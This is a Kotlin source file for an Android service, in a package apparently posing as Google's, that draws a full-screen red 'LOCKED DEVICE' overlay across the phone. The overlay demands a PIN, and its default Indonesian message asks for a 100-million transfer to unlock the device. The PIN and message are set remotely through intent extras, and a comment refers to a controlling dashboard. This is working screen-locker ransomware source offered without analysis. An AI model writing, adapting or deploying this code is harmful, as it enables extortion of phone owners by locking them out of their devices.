package com.google.xmodzz

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient

class LockService : Service() {
    private var view: WebView? = null
    private var wm: WindowManager? = null
    private var expectedPin = "1234"
    private var lockMessage = "TF 100JT KU BUKA"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        try {
            // CEK SINYAL STOP DARI DASHBOARD
            if (intent?.action == "STOP_LOCK") {
                removeOverlay()
                stopSelf()
                return START_NOT_STICKY
            }

            expectedPin = intent?.getStringExtra("pin") ?: "1234"
            lockMessage = intent?.getStringExtra("message") ?: "TF 100JT KU BUKA"
            
            removeOverlay()
            showOverlay()
        } catch (e: Exception) {
            e.printStackTrace()
        }
        return START_STICKY
    }

    private fun showOverlay() {
        try {
            wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
            view = WebView(this)
            
            view?.settings?.javaScriptEnabled = true
            view?.setBackgroundColor(Color.TRANSPARENT)
            view?.addJavascriptInterface(WebAppInterface(), "AndroidBridge")
            view?.webViewClient = WebViewClient()

            view?.loadDataWithBaseURL(null, getLockHtml(), "text/html", "UTF-8", null)

            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
            }
            
            val params = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or 
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or 
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )
            
            params.gravity = Gravity.TOP or Gravity.LEFT
            wm?.addView(view, params)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun removeOverlay() {
        try {
            if (view != null && wm != null) {
                // Cek apakah view beneran nempel sebelum dihapus
                if (view?.isAttachedToWindow == true) {
                    wm?.removeView(view)
                }
                view?.destroy()
                view = null
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun getLockHtml(): String {
        return """
        <!DOCTYPE html>
        <html lang="id">
        <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>LOCKED DEVICE</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
        <style>
        *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
        html,body{height:100%}
        body{
          font-family:'Rajdhani',sans-serif;
          background:radial-gradient(circle at 50% 32%, #420000 0%, #200000 55%, #0d0000 100%);
          color:#ff4d4d;
          overflow:hidden;
          display:flex;align-items:center;justify-content:center;
          user-select:none;
        }
        #bg{position:fixed;inset:0;z-index:0;opacity:.85}
        .scanlines{position:fixed;inset:0;z-index:1;pointer-events:none;background:repeating-linear-gradient(to bottom, rgba(255,0,0,.04) 0 1px, transparent 1px 3px);mix-blend-mode:screen;opacity:.6}
        .vignette{position:fixed;inset:0;z-index:1;pointer-events:none;background:radial-gradient(circle, transparent 45%, rgba(0,0,0,.75) 100%)}
        .wrap{position:relative;z-index:2;width:100%;max-width:340px;padding:20px;display:flex;flex-direction:column;align-items:center;text-align:center}
        .lock{width:92px;height:92px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px;color:#ff2b2b;border:1px solid rgba(255,40,40,.45);background:radial-gradient(circle, rgba(255,0,0,.20), rgba(255,0,0,0) 70%);text-shadow:0 0 16px rgba(255,0,0,.95);animation:pulse 2.2s ease-in-out infinite}
        @keyframes pulse{0%,100%{box-shadow:0 0 22px rgba(255,0,0,.35), inset 0 0 18px rgba(255,0,0,.12);transform:scale(1)}50%{box-shadow:0 0 46px rgba(255,0,0,.7), inset 0 0 28px rgba(255,0,0,.28);transform:scale(1.045)}}
        .title{margin-top:16px;font-size:26px;font-weight:700;letter-spacing:6px;color:#ff2b2b;text-shadow:0 0 12px rgba(255,0,0,.9), 0 0 34px rgba(255,0,0,.55)}
        .sub{margin-top:4px;font-size:15px;font-weight:600;letter-spacing:3px;color:#ff7a7a;text-shadow:0 0 10px rgba(255,0,0,.7);animation:flicker 3.2s infinite}
        @keyframes flicker{0%,100%{opacity:1}44%{opacity:1}46%{opacity:.3}48%{opacity:1}70%{opacity:.45}72%{opacity:1}}
        .dots{display:flex;gap:18px;margin-top:26px}
        .dots span{width:16px;height:16px;border-radius:50%;border:2px solid rgba(255,70,70,.6);box-shadow:inset 0 0 10px rgba(255,0,0,.3);transition:.15s}
        .dots span.filled{background:#ff2020;border-color:#ff2020;box-shadow:0 0 14px rgba(255,0,0,.95), 0 0 26px rgba(255,0,0,.55)}
        .dots.shake{animation:shake .42s}
        @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-9px)}40%{transform:translateX(9px)}60%{transform:translateX(-6px)}80%{transform:translateX(6px)}}
        .error{height:20px;margin-top:14px;font-size:14px;font-weight:700;letter-spacing:4px;color:#ff0000;text-shadow:0 0 12px rgba(255,0,0,.95), 0 0 26px rgba(255,0,0,.6);opacity:0;transform:translateY(-5px);transition:.2s}
        .error.show{opacity:1;transform:translateY(0)}
        .keypad{display:grid;grid-template-columns:repeat(3,1fr);gap:11px;margin-top:20px;width:100%;max-width:250px}
        .key{height:54px;border-radius:14px;border:1px solid rgba(255,60,60,.4);background:rgba(40,0,0,.55);color:#ff6b6b;font-family:'Rajdhani',sans-serif;font-size:22px;font-weight:600;cursor:pointer;transition:.13s;box-shadow:inset 0 0 12px rgba(255,0,0,.1);backdrop-filter:blur(2px)}
        .key:hover{background:rgba(90,0,0,.6)}
        .key:active{background:rgba(150,0,0,.7);box-shadow:0 0 20px rgba(255,0,0,.7), inset 0 0 16px rgba(255,0,0,.3);transform:scale(.94)}
        .key.empty{visibility:hidden;pointer-events:none}
        .key i{font-size:18px}
        .unlocked{position:fixed;inset:0;z-index:9;display:none;flex-direction:column;align-items:center;justify-content:center;background:radial-gradient(circle at 50% 40%, #001a08 0%, #000 75%);text-align:center;padding:24px}
        .unlocked.show{display:flex;animation:fadeIn .5s ease}
        @keyframes fadeIn{from{opacity:0}to{opacity:1}}
        .unlocked .ico{font-size:64px;color:#2bff88;text-shadow:0 0 22px rgba(43,255,136,.9);animation:pulse 2s ease-in-out infinite}
        .unlocked h2{margin-top:20px;font-size:26px;font-weight:700;letter-spacing:6px;color:#2bff88;text-shadow:0 0 16px rgba(43,255,136,.8)}
        .unlocked p{margin-top:8px;font-size:14px;letter-spacing:3px;color:#7dffb8}
        @media (max-height:680px){
          .lock{width:76px;height:76px;font-size:32px}
          .title{font-size:22px;letter-spacing:5px;margin-top:12px}
          .dots{margin-top:18px}
          .key{height:46px;font-size:20px}
          .keypad{gap:9px;margin-top:14px}
        }
        </style>
        </head>
        <body>
        <canvas id="bg"></canvas>
        <div class="scanlines"></div>
        <div class="vignette"></div>
        <div class="wrap" id="wrap">
          <div class="lock"><i class="fas fa-lock"></i></div>
          <h1 class="title">LOCKED DEVICE</h1>
          <p class="sub" id="lblMessage">${lockMessage}</p>
          <div class="dots" id="dots">
            <span></span><span></span><span></span><span></span>
          </div>
          <div class="error" id="error">PIN SALAH</div>
          <div class="keypad">
            <button class="key" data-key="1">1</button>
            <button class="key" data-key="2">2</button>
            <button class="key" data-key="3">3</button>
            <button class="key" data-key="4">4</button>
            <button class="key" data-key="5">5</button>
            <button class="key" data-key="6">6</button>
            <button class="key" data-key="7">7</button>
            <button class="key" data-key="8">8</button>
            <button class="key" data-key="9">9</button>
            <button class="key empty"></button>
            <button class="key" data-key="0">0</button>
            <button class="key" data-key="back"><i class="fas fa-delete-left"></i></button>
          </div>
        </div>
        <div class="unlocked" id="unlocked">
          <div class="ico"><i class="fas fa-lock-open"></i></div>
          <h2>DEVICE UNLOCKED</h2>
          <p>AKSES DIBERIKAN</p>
        </div>
        <script>
        const canvas = document.getElementById('bg'); const ctx = canvas.getContext('2d');
        let W, H, columns, drops; const FONT_SIZE = 18;
        const GLYPHS = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンあいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわをんABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'.split('');
        function resizeCanvas(){ W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; columns = Math.ceil(W / FONT_SIZE) + 1; drops = new Array(columns).fill(0).map(() => Math.random() * H / FONT_SIZE); }
        resizeCanvas(); window.addEventListener('resize', resizeCanvas);
        function drawMatrix(){
          ctx.fillStyle = 'rgba(10,0,0,0.08)'; ctx.fillRect(0, 0, W, H);
          ctx.font = '400 ' + FONT_SIZE + 'px Rajdhani, monospace';
          for (let i = 0; i < columns; i++){
            const ch = GLYPHS[Math.floor(Math.random() * GLYPHS.length)];
            const x = i * FONT_SIZE; const y = drops[i] * FONT_SIZE;
            if (Math.random() > 0.97){ ctx.fillStyle = 'rgba(255,150,150,0.70)'; } else if (Math.random() > 0.5){ ctx.fillStyle = 'rgba(255,80,80,0.55)'; } else { ctx.fillStyle = 'rgba(210,30,30,0.38)'; }
            ctx.fillText(ch, x, y); if (y > H && Math.random() > 0.975) drops[i] = 0; drops[i]++;
          }
        }
        setInterval(drawMatrix, 140);
        
        const CORRECT_PIN = '${expectedPin}'; let entered = ''; let locked = false;
        const dotsEl = document.getElementById('dots'); const dotEls = [...dotsEl.querySelectorAll('span')];
        const errorEl = document.getElementById('error'); const unlockedEl = document.getElementById('unlocked'); const wrapEl = document.getElementById('wrap');
        function renderDots(){ dotEls.forEach((d, i) => d.classList.toggle('filled', i < entered.length)); }
        function pressDigit(d){
          if (locked || entered.length >= 4) return;
          entered += d; renderDots();
          if (entered.length === 4){ locked = true; setTimeout(checkPin, 180); }
        }
        function backspace(){ if (locked) return; entered = entered.slice(0, -1); renderDots(); }
        function checkPin(){ if (entered === CORRECT_PIN){ unlockDevice(); } else { wrongPin(); } }
        function wrongPin(){
          errorEl.classList.add('show'); dotsEl.classList.add('shake');
          if (navigator.vibrate) navigator.vibrate([60, 50, 60]);
          setTimeout(() => { entered = ''; renderDots(); }, 650);
          setTimeout(() => { dotsEl.classList.remove('shake'); errorEl.classList.remove('show'); locked = false; }, 1700);
        }
        function unlockDevice(){
          wrapEl.style.display = 'none'; unlockedEl.classList.add('show');
          if (navigator.vibrate) navigator.vibrate(120);
          setTimeout(() => {
              if (window.AndroidBridge && window.AndroidBridge.unlock) {
                  window.AndroidBridge.unlock();
              }
          }, 1000);
        }
        document.querySelectorAll('.key[data-key]').forEach(btn => {
          btn.addEventListener('click', () => {
            const k = btn.dataset.key;
            if (k === 'back') backspace(); else pressDigit(k);
          });
        });
        window.addEventListener('keydown', e => {
          if (/^[0-9]$/.test(e.key)){ pressDigit(e.key); } else if (e.key === 'Backspace'){ e.preventDefault(); backspace(); }
        });
        renderDots();
        </script>
        </body>
        </html>
        """.trimIndent()
    }

    override fun onDestroy() {
        removeOverlay()
        super.onDestroy()
    }

    inner class WebAppInterface {
        @JavascriptInterface
        fun unlock() {
            stopSelf()
        }
    }

    companion object {
        fun start(ctx: Context, pin: String, msg: String) {
            try {
                val intent = Intent(ctx, LockService::class.java)
                intent.putExtra("pin", pin)
                intent.putExtra("message", msg)
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    ctx.startForegroundService(intent)
                } else {
                    ctx.startService(intent)
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        
        fun stop(ctx: Context) {
            try {
                // Kirim sinyal STOP_LOCK biar service tau ini perintah berhenti
                val intent = Intent(ctx, LockService::class.java)
                intent.action = "STOP_LOCK"
                ctx.startService(intent) 
                
                // Paksa matiin service-nya juga
                ctx.stopService(Intent(ctx, LockService::class.java))
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
}
